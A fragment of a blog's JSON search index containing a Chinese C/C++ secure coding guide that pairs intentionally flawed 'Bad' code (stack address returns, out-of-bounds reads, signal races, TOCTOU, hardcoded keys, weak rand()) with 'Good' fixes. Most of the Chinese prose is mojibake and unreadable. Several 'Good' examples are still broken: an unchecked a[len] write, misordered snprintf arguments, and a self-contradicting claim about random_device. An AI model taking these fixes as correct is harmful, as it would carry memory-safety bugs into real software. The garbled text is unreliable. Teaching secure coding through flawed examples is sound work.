GetUniqueObjectId(const Foo* objec","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/:1:1","tags":["Coding","C/C++"],"title":"é€šç”¨å®‰å…¨ç¼–ç æŒ‡å— -- C/C++ ç¯‡","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/"},{"categories":["Development"],"content":"2 ä¸æ¨èçš„ç¼–ç¨‹ä¹ æƒ¯ 2.1 ã€å¿…é¡»ã€‘switchä¸­åº”æœ‰default switchä¸­åº”è¯¥æœ‰defaultï¼Œä»¥å¤„ç†å„ç§é¢„æœŸå¤–çš„æƒ…å†µã€‚è¿™å¯ä»¥ç¡®ä¿switchæ¥å—ç”¨æˆ·è¾“å…¥ï¼Œæˆ–è€…åæœŸåœ¨å…¶ä»–å¼€å‘è€…ä¿®æ”¹å‡½æ•°åç¡®ä¿switchä»å¯ä»¥è¦†ç›–åˆ°æ‰€æœ‰æƒ…å†µï¼Œå¹¶ç¡®ä¿é€»è¾‘æ­£å¸¸è¿è¡Œã€‚ // Bad int Foo(int bar) { switch (bar \u0026 7) { case 0: return Foobar(bar); break; case 1: return Foobar(bar * 2); break; } } ä¾‹å¦‚ä¸Šè¿°ä»£ç switchçš„å–å€¼å¯èƒ½ä»0ï½7ï¼Œæ‰€ä»¥åº”å½“æœ‰defaultï¼š // Good int Foo(int bar) { switch (bar \u0026 7) { case 0: return Foobar(bar); break; case 1: return Foobar(bar * 2); break; default: return -1; } } å…³è”æ¼æ´: ä¸­é£é™©-é€»è¾‘æ¼æ´ ä¸­é£é™©-å†…å­˜æ³„æ¼ 2.2 ã€å¿…é¡»ã€‘ä¸åº”å½“åœ¨Debugæˆ–é”™è¯¯ä¿¡æ¯ä¸­æä¾›è¿‡å¤šå†…å®¹ åŒ…å«è¿‡å¤šä¿¡æ¯çš„Debugæ¶ˆæ¯ä¸åº”å½“è¢«ç”¨æˆ·è·å–åˆ°ã€‚Debugä¿¡æ¯å¯èƒ½ä¼šæ³„éœ²ä¸€äº›å€¼ï¼Œä¾‹å¦‚å†…å­˜æ•°æ®ã€å†…å­˜åœ°å€ç­‰å†…å®¹ï¼Œè¿™äº›å†…å®¹å¯ä»¥å¸®åŠ©æ”»å‡»è€…åœ¨åˆæ­¥æ§åˆ¶ç¨‹åºåï¼Œæ›´å®¹æ˜“åœ°æ”»å‡»ç¨‹åºã€‚ // Bad int Foo(int* bar) { if (bar \u0026\u0026 *bar == 5) { OutputDebugInfoToUser(\"Wrong value for bar %p = %d\\n\", bar, *bar); } } è€Œåº”è¯¥ï¼š // Good int foo(int* bar) { #ifdef DEBUG if (bar \u0026\u0026 *bar == 5) { OutputDebugInfo(\"Wrong value for bar.\\n\", bar, *bar); } #endif } å…³è”æ¼æ´: ä¸­é£é™©-ä¿¡æ¯æ³„æ¼ 2.3 ã€å¿…é¡»ã€‘ä¸åº”è¯¥åœ¨å®¢æˆ·ç«¯ä»£ç ä¸­ç¡¬ç¼–ç å¯¹ç§°åŠ å¯†ç§˜é’¥ ä¸åº”è¯¥åœ¨å®¢æˆ·ç«¯ä»£ç ä¸­ç¡¬ç¼–ç å¯¹ç§°åŠ å¯†ç§˜é’¥ã€‚ä¾‹å¦‚ï¼šä¸åº”åœ¨å®¢æˆ·ç«¯ä»£ç ä½¿ç”¨ç¡¬ç¼–ç çš„ AES/ChaCha20-Poly1305/SM1 å¯†é’¥ï¼Œä½¿ç”¨å›ºå®šå¯†é’¥çš„ç¨‹åºåŸºæœ¬å’Œæ²¡æœ‰åŠ å¯†ä¸€æ ·ã€‚ å¦‚æœä¸šåŠ¡éœ€æ±‚æ˜¯è®¤è¯åŠ å¯†æ•°æ®ä¼ è¾“ï¼Œåº”ä¼˜å…ˆè€ƒè™‘ç›´æ¥ç”¨ HTTPS åè®®ã€‚ å¦‚æœæ˜¯å…¶å®ƒä¸šåŠ¡éœ€æ±‚ï¼Œå¯è€ƒè™‘ç”±æœåŠ¡å™¨ç«¯ç”Ÿæˆå¯¹ç§°ç§˜é’¥ï¼Œå®¢æˆ·ç«¯é€šè¿‡ HTTPS ç­‰è®¤è¯åŠ å¯†é€šä¿¡æ¸ é“ä»æœåŠ¡å™¨æ‹‰å–ã€‚ æˆ–è€…æ ¹æ®ç”¨æˆ·ç‰¹å®šçš„ä¼šè¯ä¿¡æ¯ï¼Œæ¯”å¦‚ç™»å½•è®¤è¯è¿‡ç¨‹å¯ä»¥æ ¹æ®ç”¨æˆ·åç”¨æˆ·å¯†ç ä¸šåŠ¡ä¸Šä¸‹æ–‡ç­‰ä¿¡æ¯ï¼Œä½¿ç”¨ HKDF ç­‰ç®—æ³•è¡ç”Ÿå‡ºå¯¹ç§°ç§˜é’¥ã€‚ åˆæˆ–è€…ä½¿ç”¨ RSA/ECDSA + ECDHE ç­‰è¿›è¡Œè®¤è¯ç§˜é’¥åå•†ï¼Œç”Ÿæˆå¯¹ç§°ç§˜é’¥ã€‚ // Bad char g_aes_key[] = {...}; void Foo() { .... AES_func(g_aes_key, input_data, output_data); } å¯ä»¥è€ƒè™‘åœ¨çº¿ä¸ºæ¯ä¸ªç”¨æˆ·è·å–ä¸åŒçš„å¯†é’¥ï¼š // Good char* g_aes_key; void Foo() { .... AES_encrypt(g_aes_key, input_data, output_data); } void Init() { g_aes_key = get_key_from_https(user_id, ...); } å…³è”æ¼æ´: ä¸­é£é™©-ä¿¡æ¯æ³„éœ² 2.4 ã€å¿…é¡»ã€‘è¿”å›æ ˆä¸Šå˜é‡çš„åœ°å€ å‡½æ•°ä¸å¯ä»¥è¿”å›æ ˆä¸Šçš„å˜é‡çš„åœ°å€ï¼Œå…¶å†…å®¹åœ¨å‡½æ•°è¿”å›åå°±ä¼šå¤±æ•ˆã€‚ // Bad char* Foo(char* sz, int len){ char a[300] = {0}; if (len \u003e 100) { memcpy(a, sz, 100); } a[len] = '\\0'; return a; // WRONG } è€Œåº”å½“ä½¿ç”¨å †æ¥ä¼ é€’éç®€å•ç±»å‹å˜é‡ã€‚ // Good char* Foo(char* sz, int len) { char* a = new char[300]; if (len \u003e 100) { memcpy(a, sz, 100); } a[len] = '\\0'; return a; // OK } å¯¹äº C++ ç¨‹åºæ¥è¯´ï¼Œå¼ºçƒˆå»ºè®®è¿”å› stringã€vector ç­‰ç±»å‹ï¼Œä¼šè®©ä»£ç æ›´åŠ ç®€å•å’Œå®‰å…¨ã€‚ å…³è”æ¼æ´: é«˜é£é™©-å†…å­˜ç ´å 2.5 ã€å¿…é¡»ã€‘æœ‰é€»è¾‘è”ç³»çš„æ•°ç»„å¿…é¡»ä»”ç»†æ£€æŸ¥ ä¾‹å¦‚ä¸‹åˆ—ç¨‹åºå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºweek dayï¼Œä½†æ˜¯ä¸¤ä¸ªæ•°ç»„å¹¶ä¸ä¸€æ ·é•¿ï¼Œå¯¼è‡´ç¨‹åºå¯èƒ½ä¼šè¶Šç•Œè¯»ä¸€ä¸ªintã€‚ // Bad int nWeekdays[] = {1, 2, 3, 4, 5, 6}; const char* sWeekdays[] = {\"Mon\", \"Tue\", \"Wed\", \"Thu\", \"Fri\", \"Sat\", \"Sun\"}; for (int x = 0; x \u003c ARRAY_SIZE(sWeekdays); x++) { if (strcmp(sWeekdays[x], input) == 0) return nWeekdays[x]; } åº”å½“ç¡®ä¿æœ‰å…³è”çš„nWeekdayså’ŒsWeekdaysæ•°æ®ç»Ÿä¸€ã€‚ // Good const int nWeekdays[] = {1, 2, 3, 4, 5, 6, 7}; const char* sWeekdays[] = {\"Mon\", \"Tue\", \"Wed\", \"Thu\", \"Fri\", \"Sat\", \"Sun\"}; assert(ARRAY_SIZE(nWeekdays) == ARRAY_SIZE(sWeekdays)); for (int x = 0; x \u003c ARRAY_SIZE(sWeekdays); x++) { if (strcmp(sWeekdays[x], input) == 0) { return nWeekdays[x]; } } å…³è”æ¼æ´: é«˜é£é™©-å†…å­˜ç ´å 2.6 ã€å¿…é¡»ã€‘é¿å…å‡½æ•°çš„å£°æ˜å’Œå®ç°ä¸åŒ åœ¨å¤´æ–‡ä»¶ã€æºä»£ç ã€æ–‡æ¡£ä¸­åˆ—ä¸¾çš„å‡½æ•°å£°æ˜åº”å½“ä¸€è‡´ï¼Œä¸åº”å½“å‡ºç°å®šä¹‰å†…å®¹é”™ä½çš„æƒ…å†µã€‚ é”™è¯¯ï¼š foo.h int CalcArea(int width, int height); foo.cc int CalcArea(int height, int width) { // Different from foo.h if (height \u003e real_height) { return 0; } return height * width; } æ­£ç¡®ï¼š foo.h int CalcArea(int height, int width); foo.cc int CalcArea (int height, int width) { if (height \u003e real_height) { return 0; } return height * width; } å…³è”æ¼æ´: ä¸­é£é™©-é€»è¾‘é—®é¢˜ 2.7 ã€å¿…é¡»ã€‘æ£€æŸ¥å¤åˆ¶ç²˜è´´çš„é‡å¤ä»£ç ï¼ˆç›¸åŒä»£ç é€šå¸¸ä»£è¡¨é”™è¯¯ï¼‰ å½“å¼€å‘ä¸­é‡åˆ°è¾ƒé•¿çš„å¥å­æ—¶ï¼Œå¦‚æœä½ é€‰æ‹©äº†å¤åˆ¶ç²˜è´´è¯­å¥ï¼Œè¯·è®°å¾—æ£€æŸ¥æ¯ä¸€è¡Œä»£ç ï¼Œä¸è¦å‡ºç°ä¸Šä¸‹ä¸¤å¥ä¸€æ¨¡ä¸€æ ·çš„æƒ…å†µï¼Œè¿™é€šå¸¸ä»£è¡¨ä»£ç å“ªé‡Œå‡ºç°äº†é”™è¯¯ï¼š // Bad void Foobar(SomeStruct\u0026 foobase, SomeStruct\u0026 foo1, SomeStruct\u0026 foo2) { foo1.bar = (foo1.bar \u0026 0xffff) | (foobase.base \u0026 0xffff0000); foo1.bar = (foo1.bar \u0026 0xffff) | (foobase.base \u0026 0xffff0000); } å¦‚ä¸Šä¾‹ï¼Œé€šå¸¸å¯èƒ½æ˜¯ï¼š // Good void Foobar(SomeStruct\u0026 foobase, SomeStruct\u0026 foo1, SomeStruct\u0026 foo2) { foo1.bar = (foo1.bar \u0026 0xffff) | (foobase.base \u0026 0xffff0000); foo2.bar = (foo2.bar \u0026 0xffff) | (foobase.base \u0026 0xffff0000); } æœ€å¥½æ˜¯æŠŠé‡å¤çš„ä»£ç ç‰‡æ®µæå–æˆå‡½æ•°ï¼Œå¦‚æœå‡½æ•°æ¯”è¾ƒçŸ­ï¼Œå¯ä»¥è€ƒè™‘å®šä¹‰ä¸º inline å‡½æ•°ï¼Œåœ¨å‡å°‘å†—ä½™çš„åŒæ—¶ä¹Ÿèƒ½ç¡®ä¿ä¸ä¼šå½±å“æ€§èƒ½ã€‚ å…³è”æ¼æ´: ä¸­é£é™©-é€»è¾‘é—®é¢˜ 2.8 ã€å¿…é¡»ã€‘å·¦å³ä¸€è‡´çš„é‡å¤åˆ¤æ–­/æ°¸è¿œä¸ºçœŸæˆ–å‡çš„åˆ¤æ–­ï¼ˆé€šå¸¸ä»£è¡¨é”™è¯¯ï¼‰ è¿™é€šå¸¸æ˜¯ç”±äºè‡ªåŠ¨å®Œæˆæˆ–ä¾‹å¦‚Visual Assistant Xä¹‹ç±»çš„è¡¥å…¨æ’ä»¶å¯¼è‡´çš„é—®é¢˜ã€‚ // Bad if (foo1.bar == foo1.bar) { â€¦ } å¯èƒ½æ˜¯ï¼š // Good if (foo1.bar == foo2.bar) { â€¦ } å…³è”æ¼æ´: ä¸­é£é™©-é€»è¾‘é—®é¢˜ 2.9 ã€å¿…é¡»ã€‘å‡½æ•°æ¯ä¸ªåˆ†æ”¯éƒ½åº”æœ‰è¿”å›å€¼ å‡½æ•°çš„æ¯ä¸ªåˆ†æ”¯éƒ½åº”è¯¥æœ‰è¿”å›å€¼ï¼Œå¦åˆ™å¦‚æœå‡½æ•°èµ°åˆ°æ— è¿”å›å€¼çš„åˆ†æ”¯ï¼Œå…¶ç»“æœæ˜¯æœªçŸ¥çš„ã€‚ // Bad int Foo(int bar) { if (bar \u003e 100) { return 10; } else if (bar \u003e 10) { return 1; } } ä¸Šè¿°ä¾‹å­å½“bar\u003c10æ—¶ï¼Œå…¶ç»“æœæ˜¯æœªçŸ¥çš„å€¼ã€‚ // Good int Foo(int bar) { if (bar \u003e 100) { return 10; } else if (bar \u003e 10) { return 1; } return 0; } å¼€å¯é€‚å½“çº§åˆ«çš„è­¦å‘Šï¼ˆGCC ä¸­ä¸º -Wreturn-type ","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/:1:2","tags":["Coding","C/C++"],"title":"é€šç”¨å®‰å…¨ç¼–ç æŒ‡å— -- C/C++ ç¯‡","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/"},{"categories":["Development"],"content":"3 å¤šçº¿ç¨‹ 3.1 ã€å¿…é¡»ã€‘å˜é‡åº”ç¡®ä¿çº¿ç¨‹å®‰å…¨æ€§ å½“ä¸€ä¸ªå˜é‡å¯èƒ½è¢«å¤šä¸ªçº¿ç¨‹ä½¿ç”¨æ—¶ï¼Œåº”å½“ä½¿ç”¨åŸå­æ“ä½œæˆ–åŠ é”æ“ä½œã€‚ // Bad char g_somechar; void foo_thread1() { g_somechar += 3; } void foo_thread2() { g_somechar += 1; } å¯¹äºå¯ä»¥ä½¿ç”¨åŸå­æ“ä½œçš„ï¼Œåº”å½“ä½¿ç”¨ä¸€äº›å¯ä»¥ç¡®ä¿å†…å­˜å®‰å…¨çš„æ“ä½œï¼Œå¦‚ï¼š // Good volatile char g_somechar; void foo_thread1() { __sync_fetch_and_add(\u0026g_somechar, 3); } void foo_thread2() { __sync_fetch_and_add(\u0026g_somechar, 1); } å¯¹äº C ä»£ç ï¼ŒC11 åæ¨èä½¿ç”¨ atomic æ ‡å‡†åº“ã€‚ å¯¹äº C++ä»£ç ï¼ŒC++11 åï¼Œæ¨èä½¿ç”¨ std::atomicã€‚ å…³è”æ¼æ´: é«˜é£é™©-å†…å­˜ç ´å ä¸­é£é™©-é€»è¾‘é—®é¢˜ 3.2 ã€å¿…é¡»ã€‘æ³¨æ„signal handlerå¯¼è‡´çš„æ¡ä»¶ç«äº‰ ç«äº‰æ¡ä»¶ç»å¸¸å‡ºç°åœ¨ä¿¡å·å¤„ç†ç¨‹åºä¸­ï¼Œå› ä¸ºä¿¡å·å¤„ç†ç¨‹åºæ”¯æŒå¼‚æ­¥æ“ä½œã€‚æ”»å‡»è€…èƒ½å¤Ÿåˆ©ç”¨ä¿¡å·å¤„ç†ç¨‹åºäº‰ç”¨æ¡ä»¶å¯¼è‡´è½¯ä»¶çŠ¶æ€æŸåï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡ç”šè‡³ä»£ç æ‰§è¡Œã€‚ å½“ä¿¡å·å¤„ç†ç¨‹åºä¸­å‘ç”Ÿä¸å¯é‡å…¥å‡½æ•°æˆ–çŠ¶æ€æ•æ„Ÿæ“ä½œæ—¶ï¼Œå°±ä¼šå‡ºç°è¿™äº›é—®é¢˜ã€‚å› ä¸ºä¿¡å·å¤„ç†ç¨‹åºä¸­éšæ—¶å¯ä»¥è¢«è°ƒç”¨ã€‚æ¯”å¦‚ï¼Œå½“åœ¨ä¿¡å·å¤„ç†ç¨‹åºä¸­è°ƒç”¨freeæ—¶ï¼Œé€šå¸¸ä¼šå‡ºç°å¦ä¸€ä¸ªä¿¡å·äº‰ç”¨æ¡ä»¶ï¼Œä»è€Œå¯¼è‡´åŒé‡é‡Šæ”¾ã€‚å³ä½¿ç»™å®šæŒ‡é’ˆåœ¨é‡Šæ”¾åè®¾ç½®ä¸ºNULLï¼Œåœ¨é‡Šæ”¾å†…å­˜å’Œå°†æŒ‡é’ˆè®¾ç½®ä¸ºNULLä¹‹é—´ä»ç„¶å­˜åœ¨ç«äº‰çš„å¯èƒ½ã€‚ ä¸ºå¤šä¸ªä¿¡å·è®¾ç½®äº†ç›¸åŒçš„ä¿¡å·å¤„ç†ç¨‹åºï¼Œè¿™å°¤å…¶æœ‰é—®é¢˜â€”â€”å› ä¸ºè¿™æ„å‘³ç€ä¿¡å·å¤„ç†ç¨‹åºæœ¬èº«å¯èƒ½ä¼šé‡æ–°è¿›å…¥ã€‚ä¾‹å¦‚ï¼Œmalloc()å’Œfree()æ˜¯ä¸å¯é‡å…¥çš„ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½ä½¿ç”¨å…¨å±€æˆ–é™æ€æ•°æ®ç»“æ„æ¥ç®¡ç†å†…å­˜ï¼Œå¹¶ä¸”å®ƒä»¬è¢«syslog()ç­‰çœ‹ä¼¼æ— å®³çš„å‡½æ•°é—´æ¥ä½¿ç”¨ï¼›è¿™äº›å‡½æ•°å¯èƒ½ä¼šå¯¼è‡´å†…å­˜æŸåå’Œä»£ç æ‰§è¡Œã€‚ // Bad char *log_message; void Handler(int signum) { syslog(LOG_NOTICE, \"%s\\n\", log_m_essage); free(log_message); sleep(10); exit(0); } int main (int argc, char* argv[]) { log_message = strdup(argv[1]); signal(SIGHUP, Handler); signal(SIGTERM, Handler); sleep(10); } å¯ä»¥å€Ÿç”±ä¸‹åˆ—æ“ä½œè§„é¿é—®é¢˜ï¼š é¿å…åœ¨å¤šä¸ªå¤„ç†å‡½æ•°ä¸­å…±äº«æŸäº›å˜é‡ã€‚ åœ¨ä¿¡å·å¤„ç†ç¨‹åºä¸­ä½¿ç”¨åŒæ­¥æ“ä½œã€‚ å±è”½ä¸ç›¸å…³çš„ä¿¡å·ï¼Œä»è€Œæä¾›åŸå­æ€§ã€‚ é¿å…åœ¨ä¿¡å·å¤„ç†å‡½æ•°ä¸­è°ƒç”¨ä¸æ»¡è¶³å¼‚æ­¥ä¿¡å·å®‰å…¨çš„å‡½æ•°ã€‚ å…³è”æ¼æ´: é«˜é£é™©-å†…å­˜ç ´å ä¸­é£é™©-é€»è¾‘é—®é¢˜ 3.3 ã€å»ºè®®ã€‘æ³¨æ„Time-of-check Time-of-use (TOCTOU) æ¡ä»¶ç«äº‰ TOCTOUï¼š è½¯ä»¶åœ¨ä½¿ç”¨æŸä¸ªèµ„æºä¹‹å‰æ£€æŸ¥è¯¥èµ„æºçš„çŠ¶æ€ï¼Œä½†æ˜¯è¯¥èµ„æºçš„çŠ¶æ€å¯ä»¥åœ¨æ£€æŸ¥å’Œä½¿ç”¨ä¹‹é—´æ›´æ”¹ï¼Œä»è€Œä½¿æ£€æŸ¥ç»“æœæ— æ•ˆã€‚å½“èµ„æºå¤„äºè¿™ç§æ„å¤–çŠ¶æ€æ—¶ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´è½¯ä»¶æ‰§è¡Œé”™è¯¯æ“ä½œã€‚ å½“æ”»å‡»è€…å¯ä»¥å½±å“æ£€æŸ¥å’Œä½¿ç”¨ä¹‹é—´çš„èµ„æºçŠ¶æ€æ—¶ï¼Œæ­¤é—®é¢˜å¯èƒ½ä¸å®‰å…¨ç›¸å…³ã€‚è¿™å¯èƒ½å‘ç”Ÿåœ¨å…±äº«èµ„æº(å¦‚æ–‡ä»¶ã€å†…å­˜ï¼Œç”šè‡³å¤šçº¿ç¨‹ç¨‹åºä¸­çš„å˜é‡)ä¸Šã€‚åœ¨ç¼–ç¨‹æ—¶éœ€è¦æ³¨æ„é¿å…å‡ºç°TOCTOUé—®é¢˜ã€‚ ä¾‹å¦‚ï¼Œä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œè¯¥æ–‡ä»¶å¯èƒ½å·²ç»åœ¨æ£€æŸ¥å’Œlstatä¹‹é—´è¿›è¡Œäº†æ›´æ–°ï¼Œç‰¹åˆ«æ˜¯å› ä¸ºprintfæœ‰å»¶è¿Ÿã€‚ struct stat *st; lstat(\"...\", st); printf(\"foo\"); if (st-\u003est_mtimespec == ...) { printf(\"Now updating things\\n\"); UpdateThings(); } TOCTOUéš¾ä»¥ä¿®å¤ï¼Œä½†æ˜¯æœ‰ä»¥ä¸‹ç¼“è§£æ–¹æ¡ˆï¼š é™åˆ¶å¯¹æ¥è‡ªå¤šä¸ªè¿›ç¨‹çš„æ–‡ä»¶çš„äº¤å‰æ“ä½œã€‚ å¦‚æœå¿…é¡»åœ¨å¤šä¸ªè¿›ç¨‹æˆ–çº¿ç¨‹ä¹‹é—´å…±äº«å¯¹èµ„æºçš„è®¿é—®ï¼Œé‚£ä¹ˆè¯·å°è¯•é™åˆ¶â€æ£€æŸ¥â€œï¼ˆCHECKï¼‰å’Œâ€ä½¿ç”¨â€œï¼ˆUSEï¼‰èµ„æºä¹‹é—´çš„æ—¶é—´é‡ï¼Œä½¿ä»–ä»¬ç›¸è·å°½é‡ä¸è¦å¤ªè¿œã€‚è¿™ä¸ä¼šä»æ ¹æœ¬ä¸Šè§£å†³é—®é¢˜ï¼Œä½†å¯èƒ½ä¼šä½¿æ”»å‡»æ›´éš¾æˆåŠŸã€‚ åœ¨Useè°ƒç”¨ä¹‹åé‡æ–°æ£€æŸ¥èµ„æºï¼Œä»¥éªŒè¯æ˜¯å¦æ­£ç¡®æ‰§è¡Œäº†æ“ä½œã€‚ ç¡®ä¿ä¸€äº›ç¯å¢ƒé”å®šæœºåˆ¶èƒ½å¤Ÿè¢«ç”¨æ¥æœ‰æ•ˆä¿æŠ¤èµ„æºã€‚ä½†è¦ç¡®ä¿é”å®šæ˜¯æ£€æŸ¥ä¹‹å‰è¿›è¡Œçš„ï¼Œè€Œä¸æ˜¯åœ¨æ£€æŸ¥ä¹‹åè¿›è¡Œçš„ï¼Œä»¥ä¾¿æ£€æŸ¥æ—¶çš„èµ„æºä¸ä½¿ç”¨æ—¶çš„èµ„æºç›¸åŒã€‚ å…³è”æ¼æ´: é«˜é£é™©-å†…å­˜ç ´å ä¸­é£é™©-é€»è¾‘é—®é¢˜ ","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/:1:3","tags":["Coding","C/C++"],"title":"é€šç”¨å®‰å…¨ç¼–ç æŒ‡å— -- C/C++ ç¯‡","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/"},{"categories":["Development"],"content":"4 åŠ å¯†è§£å¯† 4.1 ã€å¿…é¡»ã€‘ä¸å¾—æ˜æ–‡å­˜å‚¨ç”¨æˆ·å¯†ç ç­‰æ•æ„Ÿæ•°æ® ç”¨æˆ·å¯†ç åº”è¯¥ä½¿ç”¨ Argon2, scrypt, bcrypt, pbkdf2 ç­‰ç®—æ³•åšå“ˆå¸Œä¹‹åå†å­˜å…¥å­˜å‚¨ç³»ç»Ÿ, https://password-hashing.net/ https://libsodium.gitbook.io/doc/password_hashing/default_phf#example-2-password-storage ç”¨æˆ·æ•æ„Ÿæ•°æ®ï¼Œåº”è¯¥åšåˆ°ä¼ è¾“è¿‡ç¨‹ä¸­åŠ å¯†ï¼Œå­˜å‚¨çŠ¶æ€ä¸‹åŠ å¯† ä¼ è¾“è¿‡ç¨‹ä¸­åŠ å¯†ï¼Œå¯ä»¥ä½¿ç”¨ HTTPS ç­‰è®¤è¯åŠ å¯†é€šä¿¡åè®® å­˜å‚¨çŠ¶æ€ä¸‹åŠ å¯†ï¼Œå¯ä»¥ä½¿ç”¨ SQLCipher ç­‰ç±»ä¼¼æ–¹æ¡ˆã€‚ 4.2 ã€å¿…é¡»ã€‘å†…å­˜ä¸­çš„ç”¨æˆ·å¯†ç ç­‰æ•æ„Ÿæ•°æ®åº”è¯¥å®‰å…¨æŠ¹é™¤ ä¾‹å¦‚ç”¨æˆ·å¯†ç ç­‰ï¼Œå³ä½¿æ˜¯ä¸´æ—¶ä½¿ç”¨ï¼Œä¹Ÿåº”åœ¨ä½¿ç”¨å®Œæˆååº”å½“å°†å†…å®¹å½»åº•æ¸…ç©ºã€‚ é”™è¯¯ï¼š #include \u003copenssl/crypto.h\u003e #include \u003cunistd.h\u003e { ... string user_password(100, '\\0'); snprintf(\u0026user_password, \"password: %s\", user_password.size(), password_from_input); ... } æ­£ç¡®ï¼š { ... string user_password(100, '\\0'); snprintf(\u0026user_password, \"password: %s\", user_password.size(), password_from_input); ... OPENSSL_cleanse(\u0026user_password[0], user_password.size()); } å…³è”æ¼æ´: é«˜é£é™©-æ•æ„Ÿä¿¡æ¯æ³„éœ² 4.3 ã€å¿…é¡»ã€‘rand() ç±»å‡½æ•°åº”æ­£ç¡®åˆå§‹åŒ– randç±»å‡½æ•°çš„éšæœºæ€§å¹¶ä¸é«˜ã€‚è€Œä¸”åœ¨ä½¿ç”¨å‰éœ€è¦ä½¿ç”¨srand()æ¥åˆå§‹åŒ–ã€‚æœªåˆå§‹åŒ–çš„éšæœºæ•°å¯èƒ½å¯¼è‡´æŸäº›å†…å®¹å¯é¢„æµ‹ã€‚ // Bad int main() { int foo = rand(); return 0; } ä¸Šè¿°ä»£ç æ‰§è¡Œå®Œæˆåï¼Œfooçš„å€¼æ˜¯å›ºå®šçš„ã€‚å®ƒç­‰æ•ˆäº srand(1); rand();ã€‚ // Good int main() { srand(time(0)); int foo = rand(); return 0; } å…³è”æ¼æ´: é«˜é£é™©-é€»è¾‘æ¼æ´ 4.4 ã€å¿…é¡»ã€‘åœ¨éœ€è¦é«˜å¼ºåº¦å®‰å…¨åŠ å¯†æ—¶ä¸åº”ä½¿ç”¨å¼±PRNGå‡½æ•° åœ¨éœ€è¦ç”Ÿæˆ AES/SM1/HMAC ç­‰ç®—æ³•çš„å¯†é’¥/IV/Nonceï¼Œ RSA/ECDSA/ECDH ç­‰ç®—æ³•çš„ç§é’¥ï¼Œè¿™ç±»éœ€è¦é«˜å®‰å…¨æ€§çš„ä¸šåŠ¡åœºæ™¯ï¼Œå¿…é¡»ä½¿ç”¨å¯†ç å­¦å®‰å…¨çš„éšæœºæ•°ç”Ÿæˆå™¨ (Cryptographically Secure PseudoRandom Number Generator (CSPRNG) ), ä¸å¾—ä½¿ç”¨ rand() ç­‰æ— å¯†ç å­¦å®‰å…¨æ€§ä¿è¯çš„æ™®é€šéšæœºæ•°ç”Ÿæˆå™¨ã€‚ æ¨èä½¿ç”¨çš„ CSPRNG æœ‰ï¼š OpenSSL ä¸­çš„ RAND_bytes() å‡½æ•°, https://www.openssl.org/docs/man1.1.1/man3/RAND_bytes.html libsodium ä¸­çš„ randombytes_buf() å‡½æ•° Linux kernel çš„ getrandom() ç³»ç»Ÿè°ƒç”¨, https://man7.org/linux/man-pages/man2/getrandom.2.html . æˆ–è€…è¯» /dev/urandom æ–‡ä»¶, æˆ–è€… /dev/random æ–‡ä»¶ã€‚ Apple IOS çš„ SecRandomCopyBytes(), https://developer.apple.com/documentation/security/1399291-secrandomcopybytes Windows ä¸‹çš„ BCryptGenRandom(), CryptGenRandom(), RtlGenRandom() #include \u003copenssl/aes.h\u003e #include \u003copenssl/crypto.h\u003e #include \u003copenssl/rand.h\u003e #include \u003cunistd.h\u003e { unsigned char key[16]; if (1 != RAND_bytes(\u0026key[0], sizeof(key))) { //... é”™è¯¯å¤„ç† return -1; } AES_KEY aes_key; if (0 != AES_set_encrypt_key(\u0026key[0], sizeof(key) * 8, \u0026aes_key)) { // ... é”™è¯¯å¤„ç† return -1; } ... OPENSSL_cleanse(\u0026key[0], sizeof(key)); } rand()ç±»å‡½æ•°çš„éšæœºæ€§å¹¶ä¸é«˜ã€‚æ•æ„Ÿæ“ä½œæ—¶ï¼Œå¦‚è®¾è®¡åŠ å¯†ç®—æ³•æ—¶ï¼Œä¸å¾—ä½¿ç”¨rand()æˆ–è€…ç±»ä¼¼çš„ç®€å•çº¿æ€§åŒä½™ä¼ªéšæœºæ•°ç”Ÿæˆå™¨æ¥ä½œä¸ºéšæœºæ•°å‘ç”Ÿå™¨ã€‚ç¬¦åˆè¯¥å®šä¹‰çš„æ¯”ç‰¹åºåˆ—çš„ç‰¹ç‚¹æ˜¯ï¼Œåºåˆ—ä¸­â€œ1â€çš„æ•°é‡çº¦ç­‰äºâ€œ0â€çš„æ•°é‡ï¼›åŒç†ï¼Œâ€œ01â€ã€â€œ00â€ã€â€œ10â€ã€â€œ11â€çš„æ•°é‡å¤§è‡´ç›¸åŒï¼Œä»¥æ­¤ç±»æ¨ã€‚ ä¾‹å¦‚ C æ ‡å‡†åº“ä¸­çš„ rand() çš„å®ç°åªæ˜¯ç®€å•çš„çº¿æ€§åŒä½™ç®—æ³•ï¼Œç”Ÿæˆçš„ä¼ªéšæœºæ•°å…·æœ‰è¾ƒå¼ºçš„å¯é¢„æµ‹æ€§ã€‚ å½“éœ€è¦å®ç°é«˜å¼ºåº¦åŠ å¯†ï¼Œä¾‹å¦‚æ¶‰åŠé€šä¿¡å®‰å…¨æ—¶ï¼Œä¸åº”å½“ä½¿ç”¨ rand() ä½œä¸ºéšæœºæ•°å‘ç”Ÿå™¨ã€‚ å®é™…åº”ç”¨ä¸­ï¼Œ C++11 æ ‡å‡†æä¾›çš„random_deviceä¿è¯åŠ å¯†çš„å®‰å…¨æ€§å’Œéšæœºæ€§ ä½†æ˜¯ C++ æ ‡å‡†å¹¶ä¸ä¿è¯è¿™ä¸€ç‚¹ã€‚è·¨å¹³å°çš„ä»£ç å¯ä»¥è€ƒè™‘ç”¨ OpenSSL ç­‰ä¿è¯å¯†ç 